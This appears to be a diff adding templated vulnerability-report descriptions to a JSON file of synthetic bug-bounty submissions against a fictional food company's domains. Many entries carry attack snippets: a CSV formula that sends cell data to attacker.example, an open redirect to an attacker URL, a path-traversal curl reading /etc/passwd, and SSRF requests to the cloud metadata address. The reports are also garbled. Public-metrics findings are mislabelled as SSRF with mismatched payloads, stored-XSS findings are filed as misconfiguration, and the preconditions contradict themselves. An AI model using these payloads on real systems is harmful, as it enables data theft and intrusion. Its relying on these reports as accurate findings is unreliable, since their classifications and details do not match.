           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.laerchenquell-foods.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2163,7 +2179,8 @@
           "offset": "21h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://shop.laerchenquell-foods.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2315,7 +2332,8 @@
           "offset": "7d 19h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.laerchenquell-foods.foo/export?type=records`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2437,7 +2455,8 @@
           "offset": "5d 1h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.laerchenquell-foods.foo/profile`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2609,7 +2628,8 @@
           "offset": "3d 10h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.laerchenquell-foods.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2753,7 +2773,8 @@
           "offset": "4d 9h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.laerchenquell-foods.foo/api/documents/`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2883,7 +2904,8 @@
           "offset": "7h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.laerchenquell-foods.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3014,7 +3036,8 @@
           "offset": "9d 11h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.laerchenquell-foods.foo/admin/items`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3134,7 +3157,8 @@
           "offset": "5h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.laerchenquell-foods.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3296,7 +3320,8 @@
           "offset": "4d 1h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.laerchenquell-foods.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3452,7 +3477,8 @@
           "offset": "4d 4h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.laerchenquell-foods.foo/export?type=records`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3600,7 +3626,8 @@
           "offset": "2d 7h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.laerchenquell-foods.foo/api/import`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3744,7 +3771,8 @@
           "offset": "3d 23h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.laerchenquell-foods.foo/console/queue`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3910,7 +3938,8 @@
           "offset": "6d",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.laerchenquell-foods.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4012,7 +4041,8 @@
           "offset": "2d 6h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.laerchenquell-foods.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4117,7 +4147,8 @@
           "offset": "4d 16h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.laerchenquell-foods.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4252,7 +4283,8 @@
           "offset": "6d 11h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://shop.laerchenquell-foods.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4416,7 +4448,8 @@
           "offset": "8d 9h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.laerchenquell-foods.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4548,7 +4581,8 @@
           "offset": "2d 7h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://shop.laerchenquell-foods.foo/profile`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4703,7 +4737,8 @@
           "offset": "4d 18h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.laerchenquell-foods.foo/import`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4847,7 +4882,8 @@
           "offset": "5d 7h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.laerchenquell-foods.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5018,7 +5054,8 @@
           "offset": "7d",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.laerchenquell-foods.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5129,7 +5166,8 @@
           "offset": "6d 3h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.laerchenquell-foods.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -5249,7 +5287,8 @@
           "offset": "1d 9h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.laerchenquell-foods.foo/import`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5392,7 +5431,8 @@
           "offset": "6d 7h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.laerchenquell-foods.foo/console/queue`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -5539,7 +5579,8 @@
           "offset": "2d 15h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.laerchenquell-foods.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5654,7 +5695,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.laerchenquell-foods.foo/export`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5769,7 +5811,8 @@
           "offset": "1d 12h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.laerchenquell-foods.foo/admin/queue`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -5870,7 +5913,8 @@
           "offset": "1d 10h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.laerchenquell-foods.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6020,7 +6064,8 @@
           "offset": "6d 5h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.laerchenquell-foods.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6128,7 +6173,8 @@
           "offset": "16h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.laerchenquell-foods.foo/admin/queue`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -6251,7 +6297,8 @@
           "offset": "3d 6h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
